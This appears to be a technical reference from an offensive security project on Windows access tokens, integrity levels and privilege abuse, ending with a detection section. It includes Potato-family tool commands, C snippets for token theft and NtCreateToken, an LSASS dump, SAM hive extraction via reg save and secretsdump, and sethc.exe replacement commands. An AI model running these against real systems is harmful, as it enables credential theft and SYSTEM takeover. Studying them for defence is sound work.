# Token and Privilege Abuse — Deep Dive

Windows security model internals: access tokens, integrity levels, mandatory integrity control,
privileges, and every dangerous privilege that enables LPE — from SeImpersonatePrivilege
(Potato family) to SeLoadDriverPrivilege (BYOVD bridge).

---

## 1. Windows Security Model Fundamentals

### Subjects and Objects

Windows security is based on a **subject → object** access model:
- **Subject**: the entity requesting access (a thread with an access token)
- **Object**: the resource being accessed (file, registry key, process, section, etc.)
- **Access Check**: kernel compares subject's token against object's security descriptor

Every kernel object in Windows has a `SECURITY_DESCRIPTOR` containing:
- **Owner SID**: who owns this object
- **Group SID**: primary group (mostly POSIX legacy)
- **DACL** (Discretionary ACL): list of Allow/Deny ACEs controlling access
- **SACL** (System ACL): audit policy entries

### Access Control Entry (ACE) Structure

```
ACE = {
    AceType:   ACCESS_ALLOWED_ACE | ACCESS_DENIED_ACE | ACCESS_ALLOWED_OBJECT_ACE
    AceFlags:  inheritance flags
    Mask:      access rights bitmask (FILE_READ_DATA, GENERIC_WRITE, etc.)
    SID:       identity this ACE applies to
}
```

### Access Check Flow

```
Thread makes system call → KernelAccessCheck() called

1. Get thread's effective token (impersonation token if impersonating, else primary token)
2. Check if token has SeDebugPrivilege (or is SYSTEM) → bypass DACL entirely for some objects
3. Check DACL:
   a. Walk ACEs in order
   b. Deny ACEs checked first
   c. Allow ACEs accumulate granted rights
   d. If all requested rights satisfied → access granted
   e. Else → ACCESS_DENIED
4. Generate audit event if SACL configured
```

---

## 2. Access Token Deep Dive

### Primary vs Impersonation Tokens

**Primary token**: Created at process creation. Represents the security context of the process.
Only one per process. Assigned by the kernel when the process is created (via `CreateProcess`,
`CreateProcessAsUser`, `CreateProcessWithToken`).

**Impersonation token**: A thread can temporarily assume a different security context for a
system call or series of calls. Assigned via `ImpersonateLoggedOnUser`, `SetThreadToken`,
`ImpersonateNamedPipeClient`, etc. When impersonation ends (via `RevertToSelf`), the thread
reverts to the process's primary token.

**Impersonation levels**:
```c
SecurityAnonymous      = 0  // Server can't identify client
SecurityIdentification = 1  // Server can identify but not impersonate
SecurityImpersonation  = 2  // Server can impersonate on local system
SecurityDelegation     = 3  // Server can impersonate across network
```
LPE via impersonation requires level >= SecurityImpersonation.

### Token Structure (kernel: _TOKEN object)

Key fields in the kernel TOKEN structure:
```c
typedef struct _TOKEN {
    TOKEN_SOURCE        TokenSource;       // "User32" or similar
    LUID                TokenId;           // unique ID
    LUID                AuthenticationId;  // logon session LUID
    SID                *UserAndGroupCount; 
    SID_AND_ATTRIBUTES *UserAndGroups;     // all SIDs in token
    ULONG               PrivilegeCount;    // number of privileges
    LUID_AND_ATTRIBUTES *Privileges;       // privilege list
    TOKEN_TYPE          TokenType;         // Primary or Impersonation
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
    TOKEN_MANDATORY_POLICY MandatoryPolicy;
    PSID                PrimaryGroup;
    PACL                DefaultDacl;
    ULONG               SessionId;
    // ... many more fields
} TOKEN;
```

### Token Groups and SIDs

A token contains multiple SIDs with attributes:
- **User SID**: the account the token represents
- **Group SIDs**: all groups the user belongs to (including well-known: Administrators, Users,
  Everyone, INTERACTIVE, NETWORK, Authenticated Users, etc.)
- **Integrity SID**: the mandatory integrity level (see Section 3)

Each SID in the token has attribute flags:
```
SE_GROUP_ENABLED         → SID is active
SE_GROUP_USE_FOR_DENY_ONLY → SID only used for deny ACEs (filtered admin token)
SE_GROUP_INTEGRITY       → this is an integrity SID
SE_GROUP_LOGON_ID        → this is the logon session SID
```

### Filtered (Split) Token — UAC

When a member of the Administrators group logs in interactively (without "run as
administrator"), Windows creates **two linked tokens**:
1. **Filtered token** (standard user token): Administrators group set to DENY ONLY, most
   privileges removed. This is the token used by default for new processes.
2. **Elevated token** (full admin token): Full Administrators membership, all privileges.
   Used when "Run as administrator" is invoked (triggers UAC prompt).

The tokens are linked via a `LinkedToken` field in the TOKEN structure.

This is why many LPE techniques aim for the elevated token specifically — the filtered token
already has Administrators membership but in deny-only mode.

---

## 3. Mandatory Integrity Control (MIC)

### Integrity Levels

Windows Vista introduced MIC as a second dimension of access control layered on top of DACLs.
Every subject (token) and every object has an integrity level. The kernel enforces a
**no-write-up** policy: a subject cannot write to objects at a higher integrity level.

```
Integrity Level  SID                                          Numeric Value
───────────────  ──────────────────────────────────────────   ─────────────
Untrusted        S-1-16-0                                      0x0000
Low              S-1-16-4096      (Internet Explorer tab, AppContainer)
Medium           S-1-16-8192      (standard user processes)
High             S-1-16-12288     (elevated administrator)
System           S-1-16-16384     (SYSTEM processes)
Protected        S-1-16-20480     (protected processes)
```

### MIC Policy

The integrity policy in a token's `MandatoryPolicy` field controls:
- `TOKEN_MANDATORY_POLICY_NO_WRITE_UP` (0x1): cannot write to higher-integrity objects
- `TOKEN_MANDATORY_POLICY_NEW_PROCESS_MIN` (0x2): new processes get min(parent, file) integrity

The no-write-up rule means:
- Medium integrity process cannot write to a High integrity process's memory
- Medium integrity process cannot modify a file owned at High/System integrity (if MIC ACE set)
- BUT: DACLs can still be more permissive → MIC is additional constraint on top

**No-read-down is NOT enforced by default**: A High integrity process CAN read Low integrity
objects. Only write-up is blocked.

### Integrity ACE in Security Descriptors

Objects can have a **mandatory label ACE** in their SACL controlling write-up and read-down:
```
SYSTEM_MANDATORY_LABEL_ACE:
    Mask: SYSTEM_MANDATORY_LABEL_NO_WRITE_UP  
        | SYSTEM_MANDATORY_LABEL_NO_READ_UP
        | SYSTEM_MANDATORY_LABEL_NO_EXECUTE_UP
```

Most normal files/registry keys have only `NO_WRITE_UP`. Processes at lower integrity cannot
write to them. High-integrity-labeled files additionally need read permission.

---

## 4. Windows Privileges

### Privilege vs Right

**Privilege**: A named capability assigned to a token, independent of object DACLs. Allows a
subject to bypass certain system-level restrictions. Examples: SeDebugPrivilege,
SeShutdownPrivilege, SeLoadDriverPrivilege.

**User right**: Configured in Group Policy → assigned to accounts/groups. Controls logon
rights (SeInteractiveLogonRight, SeNetworkLogonRight) and other policy-based capabilities.

### Privilege State

Each privilege in a token has two bits:
- **Present**: the privilege exists in the token (cannot be added by the process itself)
- **Enabled**: the privilege is currently active (can be toggled by the process via AdjustTokenPrivileges)

A process must explicitly enable a privilege before using it:
```c
TOKEN_PRIVILEGES tp;
tp.PrivilegeCount = 1;
LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
```

Some privileges (SeCreateTokenPrivilege, SeTcbPrivilege, SeDebugPrivilege) require
specific checks before they can be enabled — they're restricted to certain account classes.

### Privilege Enumeration

```
whoami /priv                              → show current token privileges
Process Hacker → Properties → Token tab  → full privilege list
accesschk.exe -p <pid>                   → privileges for process
Seatbelt.exe TokenPrivileges            → current token privileges with risk annotations
```

---

## 5. SeImpersonatePrivilege — The Potato Family

### What It Enables

`SeImpersonatePrivilege` allows a thread to impersonate a client **after the client has
connected to a server created by the impersonating process**. Specifically:
- `ImpersonateNamedPipeClient()` — impersonate a named pipe client
- `ImpersonateLoggedOnUser()` — impersonate a logged-on user (given their token)
- After impersonation: call `CreateProcessWithToken()` or `OpenProcessToken` to get the token
  and use it for process creation

**Who has it by default**:
- `NT AUTHORITY\LOCAL SERVICE`
- `NT AUTHORITY\NETWORK SERVICE`
- `NT AUTHORITY\SERVICE`
- Members of `Administrators` group (in elevated token)
- IIS Application Pool identities (if pool configured with certain settings)
- SQL Server service accounts

### Why Service Accounts Have It

Service accounts need SeImpersonatePrivilege to impersonate clients making RPC calls.
For example, IIS impersonates the authenticated web user when accessing files on their behalf.
Without this, web servers couldn't enforce per-user file access.

### The General Potato Attack Pattern

All "Potato" attacks follow the same pattern:
```
1. Attacker process (with SeImpersonatePrivilege) creates a named pipe server
2. Trick a SYSTEM-level process to connect to the attacker's pipe
3. The SYSTEM process authenticates → attacker calls ImpersonateNamedPipeClient()
4. Attacker now has a SYSTEM impersonation token
5. DuplicateTokenEx() → primary token → CreateProcessWithToken() → SYSTEM process
```

The challenge in each variant is **step 2**: how to make a SYSTEM process connect.

### Hot Potato (2016, Windows 7/8/10 early builds)

Used a combination of:
- NBNS spoofing (respond to WPAD broadcast with attacker's IP)
- WPAD proxy server (Windows Auto-Detect connects as SYSTEM via WinHTTP)
- NTLM reflection attack (relay captured NTLM auth to SCM/DCOM)
- DCOM activation as SYSTEM → forced to authenticate to attacker's pipe

Status: Patched. MS16-075 eliminated NTLM reflection to the same system.

### Rotten Potato (2016, Windows Server)

Used COM activation:
- DCOM activation for `{4991d34b-80a1-4291-83b6-3328366b9097}` (BITS) from LOCAL SERVICE
- BITS activates as SYSTEM via DCOMLAUNCH
- During DCOM authentication, SYSTEM authenticates with NTLM to loopback
- Attacker captures NTLM token via `AcceptSecurityContext`
- Build a SYSTEM token manually from the captured auth material

Status: Partially mitigated. Still works on some Server builds.

### Juicy Potato (2018, Windows Server)

Generalized Rotten Potato:
- Any CLSID with `RunAs = "NT AUTHORITY\SYSTEM"` (or similar elevated account) in AppID
- Force DCOM activation of that CLSID
- During COM activation, SYSTEM process authenticates via NTLM to attacker's listener
- Capture → build SYSTEM token

Usage:
```
JuicyPotato.exe -l 1337 -p C:\evil.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```
where `-c` is the CLSID to abuse. Comes with a list of working CLSIDs per Windows version.

Status: Mitigated on Windows Server 2019+ and Win10 1809+ by blocking the specific NTLM
reflection path used. The CLSID list became version-dependent.

### PrintSpoofer (2020, modern Windows)

Does NOT use NTLM reflection. Uses the **Print Spooler** (RpcRemoteFindFirstPrinterChangeNotification)
API:

```
1. Create named pipe: \\.\pipe\foo\pipe\spoolss
   (subpath must contain "pipe" in the name)
2. Call RpcRemoteFindFirstPrinterChangeNotification with:
   pszLocalMachine = "\\localhost/pipe/foo"
3. Print Spooler (SYSTEM) connects back to "\\localhost\pipe\foo\pipe\spoolss"
   → This is the attacker's pipe
4. ImpersonateNamedPipeClient() → SYSTEM token
5. CreateProcessWithToken() → SYSTEM shell
```

Why the pipe name trick works: Spooler validates the hostname as "localhost" (routable) but
the pipe path is controlled by the attacker. The slash/backslash confusion routes to the
attacker's pipe.

Status: Active on Windows 10/11 and Server unless Print Spooler is disabled.
Many organizations need the Spooler for printing → cannot simply disable it.

### RoguePotato (2020)

Hybrid approach using:
- OXID resolution (COM remote activation)
- Fake OXID resolver on loopback port
- Forces SYSTEM-level DCOM activation to resolve via attacker's fake resolver
- SYSTEM authenticates via NTLM to the fake resolver
- Token capture → SYSTEM impersonation

Bypasses the JuicyPotato mitigation by avoiding the specific NTLM reflection path.

### GodPotato (2023, latest)

Uses `ImpersonateNamedPipeClient` with a DCOM trigger that works on Windows Server 2019+
and modern Windows 10/11. DCOM activation of SYSTEM COM object → forced loopback auth →
attacker captures and impersonates.

Status: Works on most current Windows builds (2023 research). Maintained and updated.

### Summary Table

| Variant | Mechanism | Works On | Tool |
|---|---|---|---|
| Hot Potato | NBNS + NTLM reflection | Win7/8/10 early | PoC scripts |
| Rotten Potato | DCOM + NTLM BITS | Win7-Server2016 | PoC |
| Juicy Potato | DCOM CLSID enum | Pre-1809/Server2019 | JuicyPotato.exe |
| PrintSpoofer | SpoolSS pipe trick | All (Spooler on) | PrintSpoofer.exe |
| RoguePotato | OXID resolver | Win10 1809+/Srv2019 | RoguePotato.exe |
| GodPotato | DCOM trigger | Modern Win10/11/Srv | GodPotato.exe |
| SweetPotato | Multi-method combo | Modern | SweetPotato.exe |

---

## 6. SeDebugPrivilege

### What It Enables

`SeDebugPrivilege` bypasses the normal process and thread access check:
- Open **any process** with `PROCESS_ALL_ACCESS`, regardless of process DACL
- `OpenProcess(PROCESS_ALL_ACCESS, FALSE, SYSTEM_pid)` → succeeds even though SYSTEM-owned
- Write memory into any process (including LSASS, csrss, services.exe)
- Inject code / shellcode into any process

**Normal restriction**: Opening a process requires the caller's token to have access to the
target process's primary token via DACL. Protected processes (csrss, lsass on PPL) add
further restrictions.

**With SeDebugPrivilege**: The kernel's `PsOpenProcess` call skips the DACL check and grants
full access. (Protected processes are still somewhat protected, but at lower protection levels.)

### Who Has It

- Members of the **Administrators** group in their elevated token
- Any account explicitly granted SeDebugPrivilege via Group Policy

**Important**: Standard users do NOT have SeDebugPrivilege even with UAC filtered admin token.
The filtered token has this privilege removed. SeDebugPrivilege requires the full elevated token.

**IIS/service context**: Web application pools running as a custom admin-equivalent account
might have it if the account is in Administrators — but typically service accounts don't
have SeDebugPrivilege by default. However, if a service runs as LocalSystem and has shell
access, SeDebugPrivilege is available.

### Attack Paths with SeDebugPrivilege

**1. Token theft via process injection**:
```c
// Open any SYSTEM process
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, system_pid);

// Inject shellcode or:
// Open process token
HANDLE hToken;
OpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hToken);
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSysToken);
CreateProcessWithTokenW(hSysToken, 0, L"cmd.exe", NULL, 0, NULL, NULL, &si, &pi);
```

**2. LSASS memory dump**:
```
With SeDebugPrivilege, MiniDumpWriteDump(lsass) succeeds.
Yields: NTLM hashes, Kerberos tickets, plaintext passwords (if WDigest enabled)
```

**3. Process injection into winlogon.exe**:
```
winlogon.exe runs as SYSTEM, has UI station access
Inject → code runs as SYSTEM with session 1 UI access
Classic "getsystem" approach in Meterpreter
```

**4. Suspend + patch LSASS defenses**:
From userland with SeDebugPrivilege, patch LSASS to disable credential caching protections
(not recommended — very risky for system stability, detectable).

---

## 7. SeLoadDriverPrivilege

### What It Enables

`SeLoadDriverPrivilege` allows a user to load and unload kernel-mode device drivers via
`NtLoadDriver()` / `NtUnloadDriver()` (user mode wrapper: `sc.exe`, `NtLoadDriver` directly).

**Normally restricted to**: Administrators (with elevated token).

**Why it's interesting for BYOVD**:
In normal BYOVD attacks, loading a vulnerable driver requires:
1. Disabling Driver Signature Enforcement (DSE) — needs a kernel write primitive first, OR
2. Using a legitimate certificate (stolen/test-signed driver), OR
3. Having a legitimate way to load a driver = **SeLoadDriverPrivilege**

With SeLoadDriverPrivilege, an attacker can load a **legitimately signed but vulnerable
driver** without needing any kernel exploit first:
```
Non-admin account + SeLoadDriverPrivilege:
    → NtLoadDriver("\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\amdkerneldrv")
    → Vulnerable AMD Ryzen Master driver loads (signed, passes DSE)
    → BYOVD: exploit driver's IOCTL → arbitrary kernel read/write
    → Full kernel compromise without initial kernel exploit
```

**This is the critical BYOVD entry point** — see `03_byovd/` for what happens after driver load.

### Who Has SeLoadDriverPrivilege

By default:
- `NT AUTHORITY\SYSTEM`
- Members of `Administrators` (in elevated token)
- Print Operators (on domain controllers)
- Server Operators (on domain controllers)

**If a service account somehow has this privilege** (misconfiguration or intentional grant):
→ That service is a BYOVD launching pad.

### Using SeLoadDriverPrivilege for Non-Admin Driver Load

```c
// Enable the privilege first:
HANDLE hToken;
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
// AdjustTokenPrivileges with SeLoadDriverPrivilege enabled...

// Prepare registry key for driver:
// HKCU\System\CurrentControlSet\Services\<drivername>\
//   ImagePath = "\??\C:\path\to\driver.sys"
//   Type = 1 (SERVICE_KERNEL_DRIVER)

// Load:
UNICODE_STRING RegistryPath;
RtlInitUnicodeString(&RegistryPath, 
    L"\\Registry\\User\\<SID>\\System\\CurrentControlSet\\Services\\drivername");
NtLoadDriver(&RegistryPath);
```

Note: The driver's registry entry can be under HKCU (user hive) when using
SeLoadDriverPrivilege from a non-admin account — doesn't require HKLM write.

### Capcom.sys — Historical Example

The Capcom.sys driver (signed by Capcom for an anti-cheat system) exposed an IOCTL that
executed user-supplied shellcode in kernel mode. With SeLoadDriverPrivilege:
1. Load capcom.sys (signed, passes DSE)
2. Open device `\\.\Htsysm72FB`
3. Send IOCTL 0xAA013044 with shellcode pointer
4. Kernel executes shellcode → arbitrary kernel code execution
5. Modify token, disable callbacks, achieve SYSTEM

Status: Capcom.sys is blocked by Microsoft's vulnerable driver blocklist (WDAC built-in rules).
But the pattern applies to any vulnerable but signed driver.

---

## 8. SeTcbPrivilege (Act as Part of the Operating System)

### What It Enables

The most powerful privilege in Windows. A process with SeTcbPrivilege:
- Can call `LsaLogonUser` with a custom authentication package → create logon sessions for
  arbitrary accounts without knowing their password
- Can generate **primary tokens** for any account
- Can set any SID in a token (including Administrators, SYSTEM)
- Can call `CreateProcessAsUser` with a token containing arbitrary SIDs
- Essentially: create a process with **any** security context desired

**Who has it**: Only LocalSystem by default. Very rarely granted to service accounts.

### Attack Path

If somehow accessible (from LocalSystem process, or via misconfigured account):
```c
// With SeTcbPrivilege: create a logon for the SYSTEM account
// (no credentials needed)
LsaLogonUser(
    hLsa,
    &originName,
    Network,          // or Interactive
    AuthenticationPackage,
    pAuthInfo,        // custom auth info for target account
    ...
    &pToken           // returns SYSTEM token
);

// Use token to create SYSTEM process:
CreateProcessWithTokenW(pToken, 0, L"cmd.exe", ...);
```

**Practical path from LocalSystem**: Already have SYSTEM — not needed for pure LPE.
**Interesting when**: compromised a service that somehow was granted SeTcbPrivilege
(not default, but possible in misconfigured environments).

---

## 9. SeCreateTokenPrivilege

### What It Enables

Allows calling `NtCreateToken()` directly to create an arbitrary access token from scratch:
- Specify any user SID (including SYSTEM S-1-5-18)
- Include any group SIDs (including Administrators)
- Include any privileges
- Set any integrity level

**Who has it**: Only LocalSystem by default. Essentially never granted to normal accounts.

### Attack Path

```c
// Create a token with SYSTEM SID and all privileges:
SECURITY_QUALITY_OF_SERVICE sqos = { sizeof(sqos), SecurityImpersonation, FALSE, FALSE };
OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, NULL, 0, NULL, &sqos };

TOKEN_USER tokenUser = { { systemSID, 0 } };  // S-1-5-18
// ... fill in groups, privileges (SE_PRIVILEGE_ENABLED for SeDebugPrivilege etc.)
TOKEN_DEFAULT_DACL dacl = { ... };
TOKEN_OWNER owner = { adminSID };

NtCreateToken(
    &hToken, TOKEN_ALL_ACCESS, &oa,
    TokenImpersonation,
    &authId,          // can use any existing LUID
    &expirationTime,
    &tokenUser,
    &groups,
    &privileges,
    &owner, &primaryGroup, &dacl,
    &tokenSource
);

ImpersonateLoggedOnUser(hToken);
// Now running as SYSTEM for this thread
```

---

## 10. SeAssignPrimaryTokenPrivilege

### What It Enables

Allows calling `CreateProcessWithToken()` or `AssignPrimaryToken()` / `NtSetInformationProcess()`
with `ProcessAccessToken` to assign a new primary token to a process.

**Normal restriction**: Without this privilege, `CreateProcessWithTokenW` is limited (you
need to be admin or the token must be the same user).

**Who has it**: LocalSystem, NetworkService, LocalService (by default for service accounts
that need to impersonate clients and create child processes as those clients).

### Attack Path

Combined with `SeImpersonatePrivilege` (if both present):
1. Obtain a SYSTEM impersonation token (via pipe trick, Potato, etc.)
2. Duplicate to primary token
3. Use `SeAssignPrimaryTokenPrivilege` to set it as primary token for a new process
4. New process runs as SYSTEM

---

## 11. SeBackupPrivilege and SeRestorePrivilege

### What They Enable

**SeBackupPrivilege**: Bypass file read ACLs when opening with `FILE_FLAG_BACKUP_SEMANTICS`.
Allows reading any file regardless of DACL (meant for backup software).

**SeRestorePrivilege**: Bypass file write ACLs when writing with `FILE_FLAG_BACKUP_SEMANTICS`.
Allows writing to any file regardless of DACL.

**Who has them**: Backup Operators group, Administrators.

### Attack Path

**SeBackupPrivilege → read SAM, SYSTEM, SECURITY hives**:
```c
// With SeBackupPrivilege enabled:
CreateFile(
    L"\\\\?\\GLOBALROOT\\Device\\HarddiskVolume1\\Windows\\System32\\config\\SAM",
    GENERIC_READ,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS,  // ← bypasses normal ACL
    NULL
);
// Read raw SAM hive → extract password hashes → pass the hash
```

**SeRestorePrivilege → overwrite system files**:
Replace `C:\Windows\System32\utilman.exe` or `sethc.exe` (sticky keys) with `cmd.exe`:
- Triggered from the lock screen → SYSTEM shell without login

**SeBackupPrivilege → registry hive backup**:
```
reg save HKLM\SAM C:\Users\user\sam.hive
reg save HKLM\SYSTEM C:\Users\user\system.hive
# Extract NTLM hashes from hive files using secretsdump or similar
```

---

## 12. SeTakeOwnershipPrivilege

Allows taking ownership of any object (file, registry key, process) regardless of DACL.
Once owned, modify the DACL to grant yourself access.

```
takeown /f "C:\Windows\System32\sethc.exe"
icacls "C:\Windows\System32\sethc.exe" /grant user:(F)
copy cmd.exe sethc.exe
# → Lock screen → Shift×5 → SYSTEM cmd
```

Requires SeTakeOwnershipPrivilege (members of Administrators in elevated token have it).
Not useful for LPE per se (you're already admin), but useful for post-exploitation.

---

## 13. SeManageVolumePrivilege

`SeManageVolumePrivilege` → can call `DeviceIoControl` on volume handles with elevated rights.
Allows direct disk read/write bypassing filesystem ACLs via:
- `IOCTL_VOLUME_OFFLINE`, `FSCTL_MARK_VOLUME_DIRTY`
- Direct raw sector read/write → bypass all file ACLs at the filesystem layer

Who has it: Administrators. Attack path: read raw NTFS sectors → extract protected files.

---

## 14. Ferrum's Token Scoring System

Ferrum's `tokens` module scores processes by dangerous privilege presence:

```go
privilegeScores := map[string]int{
    "SeTcbPrivilege":                45,
    "SeCreateTokenPrivilege":        45,
    "SeDebugPrivilege":              40,
    "SeImpersonatePrivilege":        35,
    "SeAssignPrimaryTokenPrivilege": 35,
    "SeBackupPrivilege":             30,
    "SeRestorePrivilege":            30,
    "SeLoadDriverPrivilege":         25,
    "SeTakeOwnershipPrivilege":      20,
    "SeManageVolumePrivilege":       15,
}

// Additional score additions:
// +20 if token is elevated
// +15 if integrity is System or High
// Score threshold for reporting: > 30 points
```

**Logic**: A process scoring high is a target for:
- Token theft (if it has high-scoring privileges and is SYSTEM/elevated)
- Privilege path to SYSTEM (if current user process somehow has dangerous privileges)
- Identifies service accounts with too many privileges (hardening finding)

---

## 15. Privilege Escalation via Privilege Abuse — End-to-End

### Path A: Web Shell → NetworkService → SYSTEM

```
Initial: medium-privilege web shell (IIS, NetworkService)
Token: NT AUTHORITY\NETWORK SERVICE has SeImpersonatePrivilege

Step 1: Run PrintSpoofer.exe (or GodPotato) from web shell
Step 2: Spooler trick → connect SYSTEM to attacker's pipe
Step 3: ImpersonateNamedPipeClient → SYSTEM impersonation token
Step 4: CreateProcessWithToken → cmd.exe as SYSTEM
Result: NT AUTHORITY\SYSTEM shell
```

### Path B: SeLoadDriverPrivilege → Kernel → BYOVD

```
Initial: non-admin user account with SeLoadDriverPrivilege
(e.g., Print Operator on domain, or misconfigured service account)

Step 1: Register vulnerable driver in HKCU:
    HKCU\System\CurrentControlSet\Services\amdkerneldrv\
        ImagePath = "\??\C:\path\amd_ryzen_master_driver.sys"
        Type = 1

Step 2: NtLoadDriver() → driver loads (signed, passes DSE)
Step 3: Open driver device → send exploit IOCTL → kernel R/W primitive
Step 4: Use primitive: overwrite token, disable callbacks → SYSTEM
See: 03_byovd/amd_ryzen_master/ for specific IOCTL details
```

### Path C: SeBackupPrivilege → Hash Extraction → Admin

```
Initial: member of Backup Operators group (not admin)
Token: SeBackupPrivilege + SeRestorePrivilege

Step 1: reg save HKLM\SAM sam.hive && reg save HKLM\SYSTEM sys.hive
Step 2: secretsdump.py or pypykatz → extract NTLM hashes from hives
Step 3: Pass-the-hash for local Administrator account
Step 4: Administrator session → full local admin
```

---

## 16. Detection

### Event 4672 — Special Privileges Assigned to New Logon
Generated when a logon session is created with sensitive privileges:
```
Event 4672
Account Name: <user>
Privileges: SeDebugPrivilege, SeImpersonatePrivilege, ...
```
Useful for: identifying accounts with dangerous privileges at logon time.
Alert if: non-admin accounts have SeDebugPrivilege or SeLoadDriverPrivilege at logon.

### Event 4624 — Logon / Privilege Escalation
Monitor logon events for unusual accounts or logon types (e.g., Service logon type 5 with
sensitive privileges where not expected).

### Event 4769 — Kerberos Service Ticket (for token theft via Kerberos)
Not directly token abuse but related for detecting pass-the-ticket.

### Token Impersonation Detection (EDR Behavioral)
- Thread impersonating at SecurityImpersonation or SecurityDelegation level is normal for
  services but suspicious in non-service user processes
- Watch for: non-service process → SetThreadToken / ImpersonateNamedPipeClient → process creation
- PrintSpoofer signature: SpoolSS.dll → named pipe connect → ImpersonateNamedPipeClient in
  non-spooler process

### Sysmon Event 10 — Process Access
Log when processes with unusual tokens (or from suspicious parents) open other processes
with `PROCESS_VM_WRITE` or `PROCESS_ALL_ACCESS`.

### Potato Family Detection
All Potato variants have known IOCs:
- Process creates a named pipe with specific naming patterns
- COM activation of known CLSID followed immediately by CreateProcess
- SpoolSS.dll loaded in unexpected processes
- GodPotato: specific DCOM trigger pattern visible in DCOM event log

---

## 17. Privilege Reference Card

```
Privilege                      → LPE Path                           → Default Holders
──────────────────────────────────────────────────────────────────────────────────────
SeImpersonatePrivilege         → Potato → SYSTEM                   → Service accounts
SeDebugPrivilege               → Inject/dump any process            → Administrators
SeLoadDriverPrivilege          → BYOVD → kernel pwn                → Administrators
SeTcbPrivilege                 → Create any token                   → SYSTEM only
SeCreateTokenPrivilege         → NtCreateToken → arbitrary token    → SYSTEM only
SeAssignPrimaryTokenPrivilege  → Assign token → SYSTEM process      → Service accounts
SeBackupPrivilege              → Read SAM → hash extraction         → Backup Operators
SeRestorePrivilege             → Replace system files               → Backup Operators
SeTakeOwnershipPrivilege       → Own any object → modify ACL        → Administrators
SeManageVolumePrivilege        → Raw disk read → bypass ACLs        → Administrators
```
